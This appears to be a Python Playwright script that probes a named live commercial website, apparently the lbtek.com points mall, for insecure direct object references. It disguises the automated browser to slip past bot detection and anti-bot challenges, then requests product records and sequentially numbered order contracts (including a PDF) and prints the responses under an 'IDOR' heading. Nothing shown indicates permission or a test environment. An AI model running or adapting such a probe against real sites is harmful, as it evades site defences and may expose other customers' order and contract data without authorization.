import os
from playwright.sync_api import sync_playwright
U=os.environ.get('PROBE_URL','https://m.lbtek.com/points-mall')
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
with sync_playwright() as p:
    b=p.chromium.launch(headless=False, args=['--disable-blink-features=AutomationControlled','--no-sandbox','--disable-dev-shm-usage'])
    ctx=b.new_context(user_agent=UA, viewport={'width':1366,'height':768}, locale='zh-CN', timezone_id='Asia/Shanghai')
    ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});window.chrome={runtime:{}};")
    page=ctx.new_page(); page.goto(U, wait_until='domcontentloaded', timeout=60000)
    for i in range(12):
        page.wait_for_timeout(2000); c=page.content()
        if 'arg1=' not in c and 'renderData' not in c: break
    print('ready',flush=True)
    res=page.evaluate("""async () => {
      const out={};
      const call=async(n,u,m,bd)=>{try{const o={method:m,headers:{'Content-Type':'application/json','lang':'zh-CN'}};if(bd!==null)o.body=JSON.stringify(bd);const r=await fetch(u,o);const ct=r.headers.get('content-type')||'';const t=await r.text();out[n]=r.status+'|'+ct.slice(0,24)+'|'+(t.length>220?t.slice(0,220):t);}catch(e){out[n]='ERR '+String(e).slice(0,80);}};
      await call('prod_9376','/api/v1/product/9376','GET',null);
      await call('prod_1785','/api/v1/product/1785','GET',null);
      await call('prod_show_9376','/api/v1/product/show?productId=9376','GET',null);
      await call('prod_show_id2','/api/v1/product/show?id=9376','GET',null);
      await call('contract_1','/api/v1/order/contract/1','GET',null);
      await call('contract_2','/api/v1/order/contract/2','GET',null);
      await call('contract_3','/api/v1/order/contract/3','GET',null);
      await call('contract_pdf','/api/v1/order/contract/1.pdf','GET',null);
      await call('lead_9376','/api/v1/product/leadtime/9376?num=1','GET',null);
      await call('lead_9376b','/api/v1/product/leadtime/9376?quantity=1','GET',null);
      return out;
    }""")
    print('===== IDOR =====',flush=True)
    for k,v in res.items(): print('%-16s %s'%(k,v),flush=True)
    b.close()
